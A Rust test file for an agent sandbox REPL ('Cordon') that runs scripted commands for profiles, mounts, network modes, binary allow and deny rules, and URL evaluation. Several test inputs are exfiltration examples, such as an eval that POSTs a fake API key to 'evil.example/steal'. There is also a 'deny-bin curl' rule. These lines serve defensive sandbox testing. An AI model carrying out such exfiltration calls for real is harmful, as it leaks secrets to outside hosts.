use std::io::Cursor;

use super::*;

#[test]
fn repl_supports_ls_groups_allow_bin_plugins_and_dot_slash_configs() -> Result<()> {
    let mut session = ReplSession::new("ai-agent", None, None, ReplNetMode::Airgap, true)?;
    let input = "\
        ls configs\n\
        ls groups\n\
        allow-bin bat rg\n\
        allow-group search-tools\n\
        mount-group xdg-config\n\
        plugin list\n\
        plugin info cordon-fish\n\
        set -g @plugin 'cordon-plugins/cordon-hud'\n\
        ./configs/Cordonfile.antigravity\n\
        history\n\
        exit\n";
    let mut out = Vec::new();
    let code = run_repl_with_io(&mut session, Cursor::new(input), &mut out)?;
    assert_eq!(code, 0);

    let text = String::from_utf8(out)?;
    assert!(text.contains("Available Executable Cordonfile Configurations"));
    assert!(text.contains("Pre-Populated Command Groups"));
    assert!(text.contains("Enabled command group 'search-tools'"));
    assert!(text.contains("Mounted directory group 'xdg-config'"));
    assert!(text.contains("cordon-fish"));
    assert!(text.contains("Executing config './configs/Cordonfile.antigravity'"));
    assert!(text.contains("[dry-run] bwrap"));
    Ok(())
}

#[test]
fn repl_exercises_all_builtins_and_error_paths() -> Result<()> {
    let mut session = ReplSession::new("ai-agent", None, None, ReplNetMode::Auto, true)?;
    let input = "\
        # comment line\n\
        help\n\
        status\n\
        ls mounts\n\
        ls bins\n\
        ls plugins\n\
        ls .\n\
        profiles\n\
        templates\n\
        use untrusted-code\n\
        use nonexistent-profile\n\
        load configs/Cordonfile.python\n\
        mount .:ro\n\
        env DEMO_KEY=demo_val\n\
        allow api.openai.com\n\
        net direct\n\
        net airgap\n\
        net netns\n\
        net auto\n\
        alias ll=ls\n\
        alias\n\
        plugin enable cordon-hud\n\
        plugin disable cordon-hud\n\
        deny-bin curl\n\
        plan echo hello\n\
        eval https://api.openai.com/v1/models GET\n\
        eval https://evil.example/steal POST sk-1234567890abcdefghijklmnop\n\
        doctor\n\
        run echo dry-run-ok\n\
        !echo bang-ok\n\
        clear\n\
        cd .\n\
        history search ls\n\
        history clear\n\
        quit\n";
    let mut out = Vec::new();
    let code = run_repl_with_io(&mut session, Cursor::new(input), &mut out)?;
    assert_eq!(code, 0);

    let text = String::from_utf8(out)?;
    assert!(text.contains("Cordon Interactive Sandbox REPL Commands"));
    assert!(text.contains("Profile"));
    assert!(text.contains("untrusted-code"));
    assert!(text.contains("ai-agent"));
    assert!(text.contains("[dry-run] bwrap"));
    Ok(())
}

#[test]
fn repl_handles_missing_args_and_invalid_inputs() -> Result<()> {
    let mut session = ReplSession::new("ai-agent", None, None, ReplNetMode::Airgap, true)?;
    let input = "\
        \n\
        ?\n\
        info\n\
        use\n\
        load\n\
        load nonexistent_cordonfile_xyz\n\
        cd\n\
        cd /nonexistent_dir_xyz_999\n\
        mount\n\
        env\n\
        env NO_EQUALS\n\
        allow\n\
        net\n\
        net invalid_mode\n\
        allow-bin\n\
        deny-bin\n\
        allow-group\n\
        allow-group nonexistent_group\n\
        mount-group\n\
        mount-group nonexistent_dir_group\n\
        plugin\n\
        plugin unknown_sub\n\
        plugin enable\n\
        plugin info nonexistent_plugin\n\
        set -g @plugin 'nonexistent'\n\
        alias bad_alias\n\
        eval\n\
        plan\n\
        shell\n\
        unknown_command_xyz\n\
        exit\n";
    let mut out = Vec::new();
    let code = run_repl_with_io(&mut session, Cursor::new(input), &mut out)?;
    assert_eq!(code, 0);
    let text = String::from_utf8(out)?;
    assert!(text.contains("Usage:"));
    Ok(())
}

#[test]
fn repl_session_prompt_and_completion_metadata() -> Result<()> {
    let session = ReplSession::new(
        "ai-agent",
        Some(PathBuf::from("configs/Cordonfile.python")),
        None,
        ReplNetMode::Airgap,
        true,
    )?;
    let (prompt, visible_len) = session.prompt_colored();
    assert_ne!(prompt, "");
    assert!(visible_len > 0);
    assert!(session.valid_command_set().contains("use"));
    assert_ne!(session.completion_candidates().len(), 0);
    let _ = session.syntax_highlighting_enabled();
    let _ = session.fish_autosuggest_enabled();
    Ok(())
}

#[test]
fn repl_ls_plugin_alias_and_dot_slash_dispatch() -> Result<()> {
    let mut session = ReplSession::new("ai-agent", None, None, ReplNetMode::Airgap, true)?;
    let script = "\
# comment line
ls configs
ls mounts
ls bins
ls groups
ls plugins
ls .
ls /nonexistent_cordon_dir_xyz
groups
profiles
templates
plugin list
plugin enable cordon-fish
plugin info cordon-hud
plugin disable cordon-fish
plugin disable not-loaded
plugin unknown
@plugin cordon-hud
@plugin nonexistent-plugin
alias
alias gs=status
gs
alias bad
!echo hello
./nonexistent_cordon_script
./configs/Cordonfile.python
exit
";
    let mut out = Vec::new();
    let code = run_repl_with_io(&mut session, std::io::Cursor::new(script), &mut out)?;
    assert_eq!(code, 0);
    let text = String::from_utf8(out)?;
    assert!(text.contains("Available Executable Cordonfile Configurations"));
    assert!(text.contains("Active Directory Groups"));
    assert!(text.contains("Active Command Groups"));
    assert!(text.contains("Cordon Tmux-Style Plugin Ecosystem"));
    assert!(text.contains("Defined alias gs=\"status\""));
    assert!(text.contains("[dry-run]"));
    assert!(text.contains("does not exist"));
    Ok(())
}

#[test]
fn repl_all_commands_and_non_dry_run_exec() -> Result<()> {
    let mut session = ReplSession::new("ai-agent", None, None, ReplNetMode::Airgap, true)?;
    let script = "\
use ai-agent
use nonexistent_profile
use
load configs/Cordonfile.python
load /nonexistent_cordonfile
load
cd .
cd
mount /tmp:ro
mount /tmp:rw
mount /tmp:badmode
mount
help
status
allow-bin
allow-bin /bin/true
allow-bin nonexistent_binary_xyz
deny-bin
deny-bin /bin/true
deny-bin curl
allow-group vcs-git
allow-group bad_group_xyz
mount-group xdg-config:ro
mount-group bad_dir_group
plugin enable
plugin enable nonexistent_plugin_xyz
plugin disable
plugin info nonexistent_plugin_xyz
history
history search mount
history clear
env FOO=bar
env API_KEY=secret123
env bad
env
allow example.com
allow
net auto
net direct
net airgap
net netns
net bogus
plan
plan echo hi
eval https://example.com
eval https://example.com POST {\"k\":\"v\"}
eval
eval https://evil-blocked.example/steal
doctor
clear
run /bin/true
./configs/Cordonfile.python /bin/true
./Cargo.toml
unknown_cmd_xyz
exit
";
    let mut out = Vec::new();
    let code = run_repl_with_io(&mut session, std::io::Cursor::new(script), &mut out)?;
    assert_eq!(code, 0);
    let text = String::from_utf8(out)?;
    assert!(text.contains("Switched active profile to 'ai-agent'"));
    assert!(text.contains("Loaded config"));
    assert!(text.contains("API_KEY=<redacted>"));
    assert!(text.contains("Network mode set to 'netns'"));
    assert!(text.contains("Cleared session mounts"));
    assert!(text.contains("Unknown REPL command"));

    // Exercise non-dry-run spawn path with /bin/true and missing binary
    let mut live_session = ReplSession::new("ai-agent", None, None, ReplNetMode::Direct, false)?;
    let mut live_out = Vec::new();
    run_repl_with_io(
        &mut live_session,
        std::io::Cursor::new("run /bin/echo hello\nrun /nonexistent_cordon_bin\nexit\n"),
        &mut live_out,
    )?;
    let live_text = String::from_utf8(live_out)?;
    assert!(
        live_text.contains("process exited with status")
            || live_text.contains("failed to spawn")
            || live_text.contains("Error compiling plan")
    );
    Ok(())
}
